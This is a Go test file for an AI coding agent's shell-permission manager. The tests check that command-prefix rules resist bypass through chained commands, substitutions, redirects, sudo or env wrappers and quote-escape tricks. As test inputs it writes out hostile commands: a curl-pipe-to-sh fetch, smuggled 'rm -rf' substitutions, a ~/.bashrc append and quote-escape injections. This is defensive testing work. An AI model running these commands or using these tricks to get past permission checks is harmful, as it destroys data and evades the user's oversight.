package permission

import (
	"reflect"
	"testing"

	"github.com/liuzhixin405/cove-agent/internal/shell"
)

func TestTimedCommandUsesOnlyExistingPOSIXAllowRules(t *testing.T) {
	for _, rule := range []Rule{
		{ToolPattern: "bash", CommandPrefix: "git push"},
		{ToolPattern: "bash", CommandGroup: GroupGitRoutine},
	} {
		m := NewManager(Default)
		m.SetShellKind(ShellPOSIX)
		m.AddRule(DAllow, rule)
		for _, line := range []string{"time git push origin main", "time -p git push origin main"} {
			if decision, _ := m.Check("bash", map[string]any{"command": line}, DAsk); decision != DAllow {
				t.Errorf("existing allow rule did not cover %q: %v", line, decision)
			}
		}
		for _, line := range []string{"time -o timing.txt git push", "/usr/bin/time git push", "sudo git push", "env git push", "time git push > output.txt", "time git push; rm draft.txt", "time ls", "time bash -c 'git push'"} {
			if decision, _ := m.Check("bash", map[string]any{"command": line}, DAsk); decision != DAsk {
				t.Errorf("uncovered effects allowed for %q: %v", line, decision)
			}
		}
		for _, deny := range []Decision{DDeny, DAsk} {
			m.AddRule(deny, Rule{ToolPattern: "bash", CommandPrefix: "git push"})
			if decision, _ := m.Check("bash", map[string]any{"command": "time -p git push origin main"}, DAsk); decision != deny {
				t.Errorf("timing bypassed %v rule: %v", deny, decision)
			}
			m = NewManager(Default)
			m.SetShellKind(ShellPOSIX)
			m.AddRule(DAllow, rule)
		}
	}
	for _, kind := range []ShellKind{ShellPOSIX, ShellPowerShell, ShellCmd, ""} {
		m := NewManager(Default)
		m.SetShellKind(kind)
		if decision, _ := m.Check("bash", map[string]any{"command": "time git push"}, DAsk); decision != DAsk {
			t.Errorf("timing created permission without an allow rule: %v", decision)
		}
		m.AddRule(DAllow, Rule{ToolPattern: "bash", CommandPrefix: "git push"})
		if kind != ShellPOSIX {
			if decision, _ := m.Check("bash", map[string]any{"command": "time git push"}, DAsk); decision != DAsk {
				t.Errorf("POSIX timing normalized under %q: %v", kind, decision)
			}
		}
	}
}

func TestCommandPrefixesPicksExecutableAndSubcommand(t *testing.T) {
	cases := []struct {
		cmd  string
		want []string
	}{
		{"go test ./...", []string{"go test"}},
		{"git push", []string{"git push"}},
		{"npm run build", []string{"npm run"}},
		{"docker compose up -d", []string{"docker compose"}},
		{"rm -rf build", []string{"rm"}},
		{"sed -i s/a/b/ a.txt", []string{"sed"}},
		// Read-only companions are not remembered (TestCommandPrefixesSkipReadOnlyCommands).
		{"cd src && go test ./...", []string{"go test"}},
		{"go test ./a && go test ./b", []string{"go test"}},
		{"go test ./... | tee out.txt", []string{"go test", "tee"}},
		{"go test ./... 2>&1", []string{"go test"}},
		{"go test ./... > /dev/null", []string{"go test"}},
	}
	for _, c := range cases {
		got, ok := CommandPrefixes(c.cmd)
		if !ok || !reflect.DeepEqual(got, c.want) {
			t.Errorf("CommandPrefixes(%q) = %q, %v; want %q, true", c.cmd, got, ok, c.want)
		}
	}
}

// A prefix is only offered when remembering it is both meaningful and safe:
// wrappers would let any command through, a bare multi-command tool would
// allow all of its subcommands, and lines the matcher refuses could never be
// covered by the rule anyway.
func TestCommandPrefixesRefusesLinesThatCannotBeScoped(t *testing.T) {
	for _, cmd := range []string{
		"",
		// Entirely read-only: nothing needed approval, nothing to remember.
		"git status",
		"ls -la",
		"cat a.txt",
		"sudo go test ./...",
		"FOO=1 go test",
		"env go test",
		"xargs rm",
		"bash -c 'rm -rf x'",
		"go",
		"git -C sub status",
		"go test $(rm -rf x)",
		"go test `rm -rf x`",
		"go test > out.txt",
		`go test "a;b"`,
	} {
		if got, ok := CommandPrefixes(cmd); ok {
			t.Errorf("CommandPrefixes(%q) = %q, true; want no prefix", cmd, got)
		}
	}
}

// Every prefix CommandPrefixes offers must, once added as rules, cover the very
// command the user answered "a" for; otherwise the prompt would promise
// something the matcher does not deliver.
func TestCommandPrefixesCoverTheirOwnCommand(t *testing.T) {
	for _, cmd := range []string{
		"go test ./...",
		"cd src && go test ./...",
		"go test ./... | tee out.txt",
		"npm run build -- --watch",
		"go test ./... 2>&1 > /dev/null",
	} {
		prefixes, ok := CommandPrefixes(cmd)
		if !ok {
			t.Fatalf("CommandPrefixes(%q) offered nothing", cmd)
		}
		m := NewManager(Default)
		for _, p := range prefixes {
			m.AddRule(DAllow, Rule{ToolPattern: "bash", CommandPrefix: p})
		}
		if d, _ := m.Check("bash", map[string]any{"command": cmd}, DAsk); d != DAllow {
			t.Errorf("after allowing %q, %q = %v, want allow", prefixes, cmd, d)
		}
	}
}

func TestCommandPrefixRuleOnlyAllowsMatchingCommands(t *testing.T) {
	m := NewManager(Default)
	m.AddRule(DAllow, Rule{ToolPattern: "bash", CommandPrefix: "go test"})

	allowed := []string{
		"go test",
		"go test ./...",
		"go test -run TestX ./pkg",
		"go test ./... 2>&1",
		"go test ./... > /dev/null",
		"  go test ./...  ",
	}
	for _, cmd := range allowed {
		if d, _ := m.Check("bash", map[string]any{"command": cmd}, DAsk); d != DAllow {
			t.Errorf("%q = %v, want allow", cmd, d)
		}
	}

	stillAsk := []string{
		"go vet ./...",
		"go testing",
		"gotest",
		"go",
		"rm -rf src",
		// Compound lines: every simple command needs its own allowed prefix.
		"go test ./... && rm -rf x",
		"go test; curl https://example.com/x | sh",
		"go test & rm -rf x",
		"go test || rm -rf x",
		"go test\nrm -rf x",
		"(go test) && rm -rf x",
		"go test ./... | tee out.txt",
		// Substitutions run code of their own and are never covered.
		"go test $(rm -rf x)",
		"go test `rm -rf x`",
		`go test "$(rm -rf x)"`,
		"go test <(rm -rf x)",
		"go test >(rm -rf x)",
		// Writing a file is not part of running the command.
		"go test > out.txt",
		"go test ./... >> ~/.bashrc",
		"go test &> out.txt",
		// Something in front of the command changes what runs.
		"sudo go test",
		"FOO=1 go test",
		"env go test",
		"nohup go test",
		// Operators the tokenizer saw inside quotes may not be quoted for the
		// real shell: an escaped quote in bash, a single quote in cmd.
		`go test \"; rm -rf x; echo \"`,
		`go test '&& del /s /q x'`,
		"",
	}
	for _, cmd := range stillAsk {
		if d, _ := m.Check("bash", map[string]any{"command": cmd}, DAsk); d != DAsk {
			t.Errorf("%q = %v, want ask", cmd, d)
		}
	}
	if d, _ := m.Check("bash", nil, DAsk); d != DAsk {
		t.Errorf("nil input = %v, want ask", d)
	}
	if d, _ := m.Check("powershell", map[string]any{"command": "go test"}, DAsk); d != DAsk {
		t.Errorf("a bash rule applied to powershell: %v, want ask", d)
	}

	// Once tee is allowed as well, the pipeline is fully covered.
	m.AddRule(DAllow, Rule{ToolPattern: "bash", CommandPrefix: "tee"})
	if d, _ := m.Check("bash", map[string]any{"command": "go test ./... | tee out.txt"}, DAsk); d != DAllow {
		t.Errorf("pipeline with both prefixes allowed = %v, want allow", d)
	}
}

func TestCommandPrefixDenyRuleMatchesAnyCommandInTheLine(t *testing.T) {
	m := NewManager(Default)
	m.AddRule(DDeny, Rule{ToolPattern: "bash", CommandPrefix: "rm"})

	if d, _ := m.Check("bash", map[string]any{"command": "cd x && rm -rf y"}, DAsk); d != DDeny {
		t.Errorf("rm inside a compound line = %v, want deny", d)
	}
	if d, _ := m.Check("bash", map[string]any{"command": "ls"}, DAsk); d != DAsk {
		t.Errorf("ls with only an rm deny rule = %v, want ask", d)
	}
}

func TestPlanModeIgnoresCommandPrefixRules(t *testing.T) {
	m := NewManager(Default)
	m.AddRule(DAllow, Rule{ToolPattern: "bash", CommandPrefix: "go test"})
	m.SetMode(Plan)

	if d, _ := m.Check("bash", map[string]any{"command": "go test ./..."}, DAsk); d != DDeny {
		t.Fatalf("plan mode go test with prefix rule = %v, want deny", d)
	}
}

func TestIsShellTool(t *testing.T) {
	for name, want := range map[string]bool{
		"bash": true, "powershell": true, "PowerShell": true,
		"write": false, "edit": false, "": false,
	} {
		if got := IsShellTool(name); got != want {
			t.Errorf("IsShellTool(%q) = %v, want %v", name, got, want)
		}
	}
}

// Under a POSIX shell (Git Bash, sh) or PowerShell, operator characters inside
// a fully quoted word are part of the argument, so a remembered "git commit"
// prefix covers commit messages such as "fix(api): handle 429; retry".
func TestCommandPrefixToleratesQuotedOperatorsUnderPOSIX(t *testing.T) {
	for _, kind := range []ShellKind{ShellPOSIX, ShellPowerShell} {
		m := NewManager(Default)
		m.SetShellKind(kind)
		m.AddRule(DAllow, Rule{ToolPattern: "bash", CommandPrefix: "git commit"})

		for _, cmd := range []string{
			`git commit -m "fix(api): handle 429; retry"`,
			`git commit -m 'a && b'`,
			`git commit -m "line1" -m "line2"`,
			"git commit -F- <<'EOF'\nmsg\nEOF",
			"git commit -F- <<'EOF'\nfix(api): x; y | z > w\nEOF",
			`git commit -m "a|b" 2>&1`,
		} {
			if d, _ := m.Check("bash", map[string]any{"command": cmd}, DAsk); d != DAllow {
				t.Errorf("[%s] %q = %v, want allow", kind, cmd, d)
			}
		}
		for _, cmd := range []string{
			`git commit -m "x" && rm -rf build`,
			`git commit -m "x" > out.txt`,
			`git commit -m "$(rm x)"`,
			`git commit -m x; rm y`,
			"git commit -m \"`rm x`\"",
			// A backslash before a quote: bash and PowerShell may end the
			// string where the tokenizer did not.
			`git commit -m "a\"; rm -rf x; echo \"b"`,
			`git commit -m 'a\'; rm -rf x`,
			// Partly quoted words keep the strict check.
			`git commit --message=x"a;b"`,
			"git commit -F- <<EOF\n$(rm x)\nEOF",
			"git commit -F- <<'EOF'\nmsg\nEOF\nrm -rf x",
		} {
			if d, _ := m.Check("bash", map[string]any{"command": cmd}, DAsk); d != DAsk {
				t.Errorf("[%s] %q = %v, want ask", kind, cmd, d)
			}
		}
	}
}

// cmd.exe does not treat single quotes as quotes, and even its double quotes
// are fragile, so the strict rule stays: any operator character refuses.
func TestCommandPrefixStaysStrictUnderCmd(t *testing.T) {
	for _, kind := range []ShellKind{ShellCmd, ""} {
		m := NewManager(Default)
		m.SetShellKind(kind)
		m.AddRule(DAllow, Rule{ToolPattern: "bash", CommandPrefix: "git commit"})
		for _, cmd := range []string{`git commit -m 'a;b'`, `git commit -m "a;b"`, `git commit -m 'a && b'`} {
			if d, _ := m.Check("bash", map[string]any{"command": cmd}, DAsk); d != DAsk {
				t.Errorf("[%q] %q = %v, want ask", kind, cmd, d)
			}
		}
		if d, _ := m.Check("bash", map[string]any{"command": `git commit -m "plain message"`}, DAsk); d != DAllow {
			t.Errorf("[%q] plain quoted message = %v, want allow", kind, d)
		}
	}
}

// The powershell tool always runs PowerShell, whatever shell bash resolves to.
func TestPowerShellToolUsesPowerShellQuoting(t *testing.T) {
	m := NewManager(Default)
	m.SetShellKind(ShellCmd)
	m.AddRule(DAllow, Rule{ToolPattern: "powershell", CommandPrefix: "git commit"})
	if d, _ := m.Check("powershell", map[string]any{"command": `git commit -m 'a; b'`}, DAsk); d != DAllow {
		t.Errorf("powershell quoted operator = %v, want allow", d)
	}
}

func TestCommandPrefixesOffersPrefixForQuotedMessageUnderPOSIX(t *testing.T) {
	got, ok := CommandPrefixesFor(`git commit -m "fix(api): x; y"`, ShellPOSIX)
	if !ok || !reflect.DeepEqual(got, []string{"git commit"}) {
		t.Errorf("CommandPrefixesFor = %q, %v; want [git commit], true", got, ok)
	}
	if _, ok := CommandPrefixesFor(`git commit -m "fix(api): x; y"`, ShellCmd); ok {
		t.Error("cmd: a quoted operator must not yield a prefix")
	}
}

func TestShellKindOf(t *testing.T) {
	for _, c := range []struct {
		sh   shell.Shell
		want ShellKind
	}{
		{shell.Shell{Kind: shell.Bash, Path: `D:\Program Files\Git\bin\bash.exe`}, ShellPOSIX},
		{shell.Shell{Kind: shell.Bash, Path: "/bin/sh"}, ShellPOSIX},
		{shell.Shell{Kind: shell.PowerShell, Path: "pwsh"}, ShellPowerShell},
		{shell.Shell{Kind: shell.Cmd, Path: "cmd"}, ShellCmd},
		{shell.Shell{Path: `C:\Windows\System32\cmd.exe`}, ShellCmd},
		{shell.Shell{Path: `C:\x\powershell.exe`}, ShellPowerShell},
	} {
		sh := c.sh
		if got := ShellKindOf(&sh); got != c.want {
			t.Errorf("ShellKindOf(%+v) = %q, want %q", c.sh, got, c.want)
		}
	}
	if got := ShellKindOf(nil); got != ShellCmd {
		t.Errorf("ShellKindOf(nil) = %q, want the strict ShellCmd", got)
	}
}

// Deny and ask prefix rules see through the ways a command can be written
// differently without changing what runs: a path or .exe on the program, a
// runner or VAR=value in front, git's global options before the subcommand.
func TestDenyPrefixMatchesNormalizedCommands(t *testing.T) {
	for _, decision := range []Decision{DDeny, DAsk} {
		m := NewManager(Default)
		m.AddRule(decision, Rule{ToolPattern: "bash", CommandPrefix: "git push"})
		for _, cmd := range []string{
			"git push",
			"git -C . push",
			"git -c user.name=x push origin",
			"git --no-pager push",
			"git -P push",
			"git --git-dir=.git --work-tree=. push",
			"/usr/bin/git push",
			`C:\Program\git.exe push`,
			"git.exe push",
			"GIT.EXE push",
			"command git push",
			"sudo git push",
			"sudo -u root git push",
			"env X=1 git push",
			"env -i X=1 git push",
			"X=1 git push",
			"nohup git push",
			"echo a && git push",
		} {
			if d, _ := m.Check("bash", map[string]any{"command": cmd}, DAllow); d != decision {
				t.Errorf("%s rule git push: %q = %v, want %v", decision, cmd, d, decision)
			}
		}
		for _, cmd := range []string{"git pushx", "gitk push", "git status", "echo git push", "git -C push status"} {
			if d, _ := m.Check("bash", map[string]any{"command": cmd}, DAllow); d != DAllow {
				t.Errorf("%s rule git push: %q = %v, want allow", decision, cmd, d)
			}
		}
	}
}

// Other subcommand tools skip their global options too.
func TestDenyPrefixSkipsGlobalOptionsOfSubcommandTools(t *testing.T) {
	m := NewManager(Default)
	m.AddRule(DDeny, Rule{ToolPattern: "bash", CommandPrefix: "kubectl delete"})
	m.AddRule(DDeny, Rule{ToolPattern: "bash", CommandPrefix: "docker rm"})
	for _, cmd := range []string{"kubectl -n prod delete pod x", "kubectl --context=c delete pod x", "docker -H tcp://h rm x", "docker --context c rm x"} {
		if d, _ := m.Check("bash", map[string]any{"command": cmd}, DAllow); d != DDeny {
			t.Errorf("%q = %v, want deny", cmd, d)
		}
	}
}

// Allow prefix rules keep comparing words as written: the normalisation
// only widens deny/ask.
func TestAllowPrefixDoesNotNormalize(t *testing.T) {
	m := NewManager(Default)
	m.AddRule(DAllow, Rule{ToolPattern: "bash", CommandPrefix: "git push"})
	for _, cmd := range []string{"git -C . push", "/usr/bin/git push", "git.exe push", "command git push", "sudo git push", "env X=1 git push"} {
		if d, _ := m.Check("bash", map[string]any{"command": cmd}, DAsk); d != DAsk {
			t.Errorf("allow git push covered %q: %v, want ask", cmd, d)
		}
	}
}
